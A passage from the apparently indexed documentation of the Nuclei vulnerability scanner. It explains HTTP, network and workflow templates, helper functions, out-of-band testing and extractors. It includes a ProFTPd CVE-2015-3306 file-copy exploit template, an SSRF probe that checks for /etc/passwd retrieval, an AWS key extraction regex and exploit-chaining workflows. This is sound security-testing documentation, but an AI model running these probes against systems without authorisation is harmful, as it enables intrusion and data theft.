path of URL and runs two matchers, one with AND conditions with string match in header and another matcher against response body. id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body","title":"Matchers with conditions"},{"location":"template-examples/http/#multiple-matcher-conditions","text":"This template requests / path of URL and runs two matchers with AND conditions, one with OR conditions with string match in header and another matcher against response body, both condition has to be true in order to match this template. id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - \"{{BaseURL}}/\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body","title":"Multiple matcher conditions"},{"location":"template-examples/http/#custom-headers","text":"This template requests / path of the URL as GET request with additional custom headers defined in the template. id : custom-headers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and","title":"Custom headers"},{"location":"template-examples/http/#post-requests","text":"This template makes POST request to /admin endpoint with defined data as body parameter in the template. id : post-request info : name : Test HTTP Template author : pdteam severity : info requests : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"POST requests"},{"location":"template-examples/http/#time-based-matcher","text":"This template is example of DSL based duration matcher that returns true when the response time matched the defined duration, in this case 6 or more than 6 seconds. id : time-based-matcher info : name : DSL based response time matcher author : pdteam severity : none requests : - raw : - | GET /slow HTTP/1.1 matchers : - type : dsl dsl : - 'duration>=6'","title":"Time based Matcher"},{"location":"template-examples/network/","text":"Basic Network Request \u00b6 This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are ran to identify valid response, which in this case is PONG . id : basic-network-request info : name : Basic Network Request author : pdteam severity : info network : - host : - \"{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\" TLS Network Request \u00b6 Similar to the above template, but the connection to the service is done with TLS enabled. id : basic-tls-network-request info : name : Basic TLS Network Request author : pdteam severity : info network : - host : - \"tls://{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\" Hex Input Request \u00b6 This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are ran to identify valid response, which in this case is PONG . The match words here are encoded in Hexadecimal, using encoding: hex option of matchers. id : hex-network-request info : name : Hex Input Network Request author : pdteam severity : info network : - host : - \"{{Hostname}}\" inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" read-size : 4 matchers : - type : word part : data encoding : hex words : - \"504f4e47\" Input Expressions \u00b6 Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using hex_decode function to send decoded input over wire. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle network : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" Multi-Step Requests \u00b6 This last example is an RCE in proFTPd which if vulnerable, allows to place arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using {{randstr}} , and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of Copy successful in the response. id : CVE-2015-3306 info : name : ProFTPd RCE author : pd-team severity : high reference : https://github.com/t0kx/exploit-CVE-2015-3306 tags : cve,cve2015,ftp,rce network : - inputs : - data : \"site cpfr /proc/self/cmdline\\r\\n\" read : 1024 - data : \"site cpto /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpfr /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpto /var/www/html/{{randstr}}\\r\\n\" host : - \"{{Hostname}}\" read-size : 1024 matchers : - type : word words : - \"Copy successful\"","title":"Network"},{"location":"template-examples/network/#basic-network-request","text":"This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are ran to identify valid response, which in this case is PONG . id : basic-network-request info : name : Basic Network Request author : pdteam severity : info network : - host : - \"{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\"","title":"Basic Network Request"},{"location":"template-examples/network/#tls-network-request","text":"Similar to the above template, but the connection to the service is done with TLS enabled. id : basic-tls-network-request info : name : Basic TLS Network Request author : pdteam severity : info network : - host : - \"tls://{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\"","title":"TLS Network Request"},{"location":"template-examples/network/#hex-input-request","text":"This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are ran to identify valid response, which in this case is PONG . The match words here are encoded in Hexadecimal, using encoding: hex option of matchers. id : hex-network-request info : name : Hex Input Network Request author : pdteam severity : info network : - host : - \"{{Hostname}}\" inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" read-size : 4 matchers : - type : word part : data encoding : hex words : - \"504f4e47\"","title":"Hex Input Request"},{"location":"template-examples/network/#input-expressions","text":"Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using hex_decode function to send decoded input over wire. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle network : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\"","title":"Input Expressions"},{"location":"template-examples/network/#multi-step-requests","text":"This last example is an RCE in proFTPd which if vulnerable, allows to place arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using {{randstr}} , and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of Copy successful in the response. id : CVE-2015-3306 info : name : ProFTPd RCE author : pd-team severity : high reference : https://github.com/t0kx/exploit-CVE-2015-3306 tags : cve,cve2015,ftp,rce network : - inputs : - data : \"site cpfr /proc/self/cmdline\\r\\n\" read : 1024 - data : \"site cpto /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpfr /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpto /var/www/html/{{randstr}}\\r\\n\" host : - \"{{Hostname}}\" read-size : 1024 matchers : - type : word words : - \"Copy successful\"","title":"Multi-Step Requests"},{"location":"template-examples/workflow/","text":"Generic workflows \u00b6 A generic workflow that runs two templates, one to detect Jira and another to detect Confluence. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : /root/jira-detect.yaml - template : /root/confluence-detect.yaml Basic conditional workflows \u00b6 A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits for it are ran. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml Multi condition workflows \u00b6 This template demostrates nested workflows with nuclei, where there's multiple levels of chaining of templates. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows with matcher \u00b6 This template detects if wordpress is running on an input host, and if found a list of exploits and cves for wordpress are ran id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml Multiple Matcher workflow \u00b6 Very similar to the last example, with multiple matcher names. id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml match : - value : vbulletin subtemplates : - template : /root/vbulletin-exp1.yaml - template : /root/vbulletin-exp2.yaml - value : jboss subtemplates : - template : /root/jboss-exp1.yaml - template : /root/jboss-exp2.yaml","title":"Workflow"},{"location":"template-examples/workflow/#generic-workflows","text":"A generic workflow that runs two templates, one to detect Jira and another to detect Confluence. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : /root/jira-detect.yaml - template : /root/confluence-detect.yaml","title":"Generic workflows"},{"location":"template-examples/workflow/#basic-conditional-workflows","text":"A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits for it are ran. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml","title":"Basic conditional workflows"},{"location":"template-examples/workflow/#multi-condition-workflows","text":"This template demostrates nested workflows with nuclei, where there's multiple levels of chaining of templates. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml","title":"Multi condition workflows"},{"location":"template-examples/workflow/#conditional-workflows-with-matcher","text":"This template detects if wordpress is running on an input host, and if found a list of exploits and cves for wordpress are ran id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml","title":"Conditional workflows with matcher"},{"location":"template-examples/workflow/#multiple-matcher-workflow","text":"Very similar to the last example, with multiple matcher names. id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml match : - value : vbulletin subtemplates : - template : /root/vbulletin-exp1.yaml - template : /root/vbulletin-exp2.yaml - value : jboss subtemplates : - template : /root/jboss-exp1.yaml - template : /root/jboss-exp2.yaml","title":"Multiple Matcher workflow"},{"location":"templating-guide/","text":"Templating Guide \u00b6 Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Guide to write your own nuclei template - Template Details \u00b6 Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with YAML extension. The template files can be created any text editor of your choice. id : git-config ID must not contain spaces. This is done to allow easier output parsing. Information \u00b6 Next important piece of information about a template is the info block. Info block provides name , author , description , severity and tags . It also contain severity field which indicates the severity of the template, info block also supports dynamic fields, so one can define N number of key: value blocks to provide more useful information about the template. reference is another popular tag to define external reference links for the template. Another useful tag to always add in info block is tags . This allows you to set some custom tags to a template, depending on the purpose like cve , rce etc. This allows nuclei to identify templates with your input tags and only run them. Example of an info block - info : name : Git Config File Detection Template author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. tags : git,config Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired requests are made to the target sites. The best part of this is you can simply share your crafted template with your team mates, triage/security team to replicate the issue on the other side with ease.","title":"Introduction"},{"location":"templating-guide/#templating-guide","text":"Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Guide to write your own nuclei template -","title":"Templating Guide"},{"location":"templating-guide/#template-details","text":"Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with YAML extension. The template files can be created any text editor of your choice. id : git-config ID must not contain spaces. This is done to allow easier output parsing.","title":"Template Details"},{"location":"templating-guide/#information","text":"Next important piece of information about a template is the info block. Info block provides name , author , description , severity and tags . It also contain severity field which indicates the severity of the template, info block also supports dynamic fields, so one can define N number of key: value blocks to provide more useful information about the template. reference is another popular tag to define external reference links for the template. Another useful tag to always add in info block is tags . This allows you to set some custom tags to a template, depending on the purpose like cve , rce etc. This allows nuclei to identify templates with your input tags and only run them. Example of an info block - info : name : Git Config File Detection Template author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. tags : git,config Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired requests are made to the target sites. The best part of this is you can simply share your crafted template with your team mates, triage/security team to replicate the issue on the other side with ease.","title":"Information"},{"location":"templating-guide/helper-functions/","text":"Helper functions \u00b6 Here is the list of all supported helper functions can be used in the RAW requests / Network requests. Helper function Description Example len Length of a string len(\"Hello\") toupper String to uppercase toupper(\"Hello\") tolower String to lowercase tolower(\"Hello\") replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") replace_regex Replace string parts with regex replace_regex(\"test\", \"regextomach\", \"replacewith\") trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") trimspace Remove trailing spaces trimspace(\" Hello \") trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") reverse Reverse the string reverse(\"ab\") base64 Encode string to base64 base64(\"Hello\") base64_py Encode string to base64 like python (with new lines) base64_py(\"Hello\") base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") url_encode URL encode a string url_encode(\"hxxps://projectdiscovery.io/test?a=1\") url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") hex_encode Hex encode a string hex_encode(\"aa\") hex_decode Hex decode a string hex_decode(\"6161\") html_escape HTML escape a string html_escape(\" test \") html_unescape HTML unescape a string html_unescape(\"<body>test</body>\") md5 Calculate md5 of string md5(\"Hello\") sha256 Calculate sha256 of string sha256(\"Hello\") sha1 Calculate sha1 of string sha1(\"Hello\") mmh3 Calculate mmh3 of string mmh3(\"Hello\") contains Verify if a string contains another one contains(\"Hello\", \"lo\") regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") rand_char Pick a random char among charset (optional, default letters and numbers) avoiding badchars (optional, default empty) rand_char(\"charset\", \"badchars\") rand_char Pick a random sequence of length l among charset (optional, default to letters and numbers) avoiding badchars (optional, default empty) rand_base(l, \"charset\", \"badchars\") rand_text_alphanumeric Pick a random sequence of length l among letters and numbers avoiding badchars (optional) rand_text_alphanumeric(l, \"badchars\") rand_text_alpha Pick a random sequence of length l among letters avoiding badchars rand_text_alpha(l, \"charset\") rand_text_numeric Pick a random sequence of length l among numbers avoiding badchars rand_text_numeric(l, \"charset\") rand_int Pick a random integer between min and max rand_int(min, max) waitfor block the logic execution for x seconds waitfor(10) collab Checks if burp collaborator interactions contains a particular pattern collab(\"aaa.burpcollaborator.net\")","title":"Helper Functions"},{"location":"templating-guide/helper-functions/#helper-functions","text":"Here is the list of all supported helper functions can be used in the RAW requests / Network requests. Helper function Description Example len Length of a string len(\"Hello\") toupper String to uppercase toupper(\"Hello\") tolower String to lowercase tolower(\"Hello\") replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") replace_regex Replace string parts with regex replace_regex(\"test\", \"regextomach\", \"replacewith\") trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") trimspace Remove trailing spaces trimspace(\" Hello \") trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") reverse Reverse the string reverse(\"ab\") base64 Encode string to base64 base64(\"Hello\") base64_py Encode string to base64 like python (with new lines) base64_py(\"Hello\") base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") url_encode URL encode a string url_encode(\"hxxps://projectdiscovery.io/test?a=1\") url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") hex_encode Hex encode a string hex_encode(\"aa\") hex_decode Hex decode a string hex_decode(\"6161\") html_escape HTML escape a string html_escape(\" test \") html_unescape HTML unescape a string html_unescape(\"<body>test</body>\") md5 Calculate md5 of string md5(\"Hello\") sha256 Calculate sha256 of string sha256(\"Hello\") sha1 Calculate sha1 of string sha1(\"Hello\") mmh3 Calculate mmh3 of string mmh3(\"Hello\") contains Verify if a string contains another one contains(\"Hello\", \"lo\") regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") rand_char Pick a random char among charset (optional, default letters and numbers) avoiding badchars (optional, default empty) rand_char(\"charset\", \"badchars\") rand_char Pick a random sequence of length l among charset (optional, default to letters and numbers) avoiding badchars (optional, default empty) rand_base(l, \"charset\", \"badchars\") rand_text_alphanumeric Pick a random sequence of length l among letters and numbers avoiding badchars (optional) rand_text_alphanumeric(l, \"badchars\") rand_text_alpha Pick a random sequence of length l among letters avoiding badchars rand_text_alpha(l, \"charset\") rand_text_numeric Pick a random sequence of length l among numbers avoiding badchars rand_text_numeric(l, \"charset\") rand_int Pick a random integer between min and max rand_int(min, max) waitfor block the logic execution for x seconds waitfor(10) collab Checks if burp collaborator interactions contains a particular pattern collab(\"aaa.burpcollaborator.net\")","title":"Helper functions"},{"location":"templating-guide/interactsh/","text":"Since release of Nuclei v2.3.6 , Nuclei supports using the interact.sh API to achieve OOB based vulnerability scanning with automatic Request correlation built in. It's as easy as writing {{interactsh-url}} anywhere in the request, and adding a matcher for interact_protocol . Nuclei will handle correlation of the interaction to the template & the request it was generated from allowing effortless OOB scanning. Interactsh Placeholder \u00b6 {{interactsh-url}} placeholder is supported in http and network requests. An example of nuclei request with {{interactsh-url}} placeholders is provided below. These are replaced on runtime with unique interact.sh URLs. - raw : - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}} Interactsh Matchers \u00b6 Interactsh interactions can be used with word , regex or dsl matcher/extractor using following parts. part interactsh_protocol interactsh_request interactsh_response interactsh_protocol Value can be dns, http or smtp. This is the standard matcher for every interactsh based template with dns often as the common value as it is very non-intrusive in nature. interactsh_request The request that the interact.sh server recieved. interactsh_response The response that the interact.sh server sent to the client. Example of Interactsh DNS Interaction matcher: matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\" Example of HTTP Interaction matcher + word matcher on Interaction content matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the HTTP Interaction words : - \"http\" - type : regex part : interactsh_request # Confirms the retrieval of etc/passwd file regex : - \"root:[x*]:0:0:\"","title":"OOB Testing"},{"location":"templating-guide/interactsh/#interactsh-placeholder","text":"{{interactsh-url}} placeholder is supported in http and network requests. An example of nuclei request with {{interactsh-url}} placeholders is provided below. These are replaced on runtime with unique interact.sh URLs. - raw : - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}}","title":"Interactsh Placeholder"},{"location":"templating-guide/interactsh/#interactsh-matchers","text":"Interactsh interactions can be used with word , regex or dsl matcher/extractor using following parts. part interactsh_protocol interactsh_request interactsh_response interactsh_protocol Value can be dns, http or smtp. This is the standard matcher for every interactsh based template with dns often as the common value as it is very non-intrusive in nature. interactsh_request The request that the interact.sh server recieved. interactsh_response The response that the interact.sh server sent to the client. Example of Interactsh DNS Interaction matcher: matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\" Example of HTTP Interaction matcher + word matcher on Interaction content matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the HTTP Interaction words : - \"http\" - type : regex part : interactsh_request # Confirms the retrieval of etc/passwd file regex : - \"root:[x*]:0:0:\"","title":"Interactsh Matchers"},{"location":"templating-guide/preprocessors/","text":"Template Preprocessors \u00b6 Certain pre-processors can be specified globally anywhere in the template that run as soon as the template is loaded to achieve things like random ids generated for each template run. randstr \u00b6 Info Generates a random ID for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. randstr can be suffixed by a number, and new random ids will be created for those names too. Ex. {{randstr_1}} which will remain same across the template. randstr is also supported within matchers and can be used to match the inputs. For example:- requests : - method : POST path : - \"{{BaseURL}}/level1/application/\" headers : cmd : echo '{{randstr}}' matchers : - type : word words : - '{{randstr}}'","title":"Preprocessors"},{"location":"templating-guide/preprocessors/#template-preprocessors","text":"Certain pre-processors can be specified globally anywhere in the template that run as soon as the template is loaded to achieve things like random ids generated for each template run.","title":"Template Preprocessors"},{"location":"templating-guide/preprocessors/#randstr","text":"Info Generates a random ID for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. randstr can be suffixed by a number, and new random ids will be created for those names too. Ex. {{randstr_1}} which will remain same across the template. randstr is also supported within matchers and can be used to match the inputs. For example:- requests : - method : POST path : - \"{{BaseURL}}/level1/application/\" headers : cmd : echo '{{randstr}}' matchers : - type : word words : - '{{randstr}}'","title":"randstr"},{"location":"templating-guide/workflows/","text":"Workflows \u00b6 Workflows allow users to define an execution sequence for templates. The templates will be run on the defined conditions. These are the most efficient way to use nuclei, where all the templates are configured based on needs of users. This means, you can create Technology Based / Target based workflows, like Wordpress Workflow, Jira Workflow which only run when the specific technology is detected. If the tech stack is known, we recommend creating your custom workflows to run your scans. This leads to much lower scan times with better results. Workflows can be defined with workflows attribute, following the template or subtemplates to execute. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows Generic Workflows \u00b6 In generic workflow one can define single or multiple template to be executed from a single workflow file. It supports both files and directories as input. A workflow that runs all config related templates on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/ Conditional Workflows \u00b6 You can also create conditional templates which execute after matching the condition from a previous template. This is mostly useful for vulnerability detection and exploitation as well as tech based detection and exploitation. Use-cases for these kind of workflows are vast and varied. Templates based condition check A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - template : exploits/jira-exploit-1.yaml - template : exploits/jira-exploit-1.yaml Matcher Name based condition check A workflow that executes subtemplates when a matcher of base template is found in result. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as many and as nested checks for workflows as needed. Subtemplate and matcher name based multi level conditional check A workflow showcasing chain of template executions that run only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on all the targets and generally come with good ROI on your time and is gentle for the targets as well. More complete workflow examples are provided here","title":"Workflows"},{"location":"templating-guide/workflows/#workflows","text":"Workflows allow users to define an execution sequence for templates. The templates will be run on the defined conditions. These are the most efficient way to use nuclei, where all the templates are configured based on needs of users. This means, you can create Technology Based / Target based workflows, like Wordpress Workflow, Jira Workflow which only run when the specific technology is detected. If the tech stack is known, we recommend creating your custom workflows to run your scans. This leads to much lower scan times with better results. Workflows can be defined with workflows attribute, following the template or subtemplates to execute. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows","title":"Workflows"},{"location":"templating-guide/workflows/#generic-workflows","text":"In generic workflow one can define single or multiple template to be executed from a single workflow file. It supports both files and directories as input. A workflow that runs all config related templates on the list of give URLs. workflows : - template : files/git-config.yaml - template : files/svn-config.yaml - template : files/env-file.yaml - template : files/backup-files.yaml A workflow that runs specific list of checks defined for your project. workflows : - template : cves/ - template : exposed-tokens/ - template : exposures/","title":"Generic Workflows"},{"location":"templating-guide/workflows/#conditional-workflows","text":"You can also create conditional templates which execute after matching the condition from a previous template. This is mostly useful for vulnerability detection and exploitation as well as tech based detection and exploitation. Use-cases for these kind of workflows are vast and varied. Templates based condition check A workflow that executes subtemplates when base template gets matched. workflows : - template : technologies/jira-detect.yaml subtemplates : - template : exploits/jira-exploit-1.yaml - template : exploits/jira-exploit-1.yaml Matcher Name based condition check A workflow that executes subtemplates when a matcher of base template is found in result. workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - template : exploits/vbulletin-exp1.yaml - template : exploits/vbulletin-exp2.yaml - name : jboss subtemplates : - template : exploits/jboss-exp1.yaml - template : exploits/jboss-exp2.yaml In similar manner, one can create as many and as nested checks for workflows as needed. Subtemplate and matcher name based multi level conditional check A workflow showcasing chain of template executions that run only if the previous templates get matched. workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on all the targets and generally come with good ROI on your time and is gentle for the targets as well. More complete workflow examples are provided here","title":"Conditional Workflows"},{"location":"templating-guide/operators/extractors/","text":"Extractors \u00b6 Extractors can be used to extract and display in results a match from the response returned by a module. Types \u00b6 Multiple extractors can be specified in a request. As of now we support two type of extractors. regex - Extract data from a part based on a Regular Expression. kval - Extract a part from the protocol result. Example extractor for HTTP Response body using regex - # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" A kval extractor example to extract content-type header from HTTP Protocol Response. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part : header kval : # header value to extract from response - content-type Dynamic extractor \u00b6 Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc can be extracted and used in requests. Example of defining a dynamic extractor with name api_key which will capture a regex based pattern from the request. extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the extracted value and can be used in any part of the next requests. This feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable as this will avoid printing extracted values in the terminal. An optional regex match-group can also be specified for the regex for more complex matches. # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_token part : body # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted (by ([[:alnum:]]{16})) as abcdefgh12345678 . If no group option is provided with this regex, the above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Extractors"},{"location":"templating-guide/operators/extractors/#extractors","text":"Extractors can be used to extract and display in results a match from the response returned by a module.","title":"Extractors"},{"location":"templating-guide/operators/extractors/#types","text":"Multiple extractors can be specified in a request. As of now we support two type of extractors. regex - Extract data from a part based on a Regular Expression. kval - Extract a part from the protocol result. Example extractor for HTTP Response body using regex - # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" A kval extractor example to extract content-type header from HTTP Protocol Response. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part 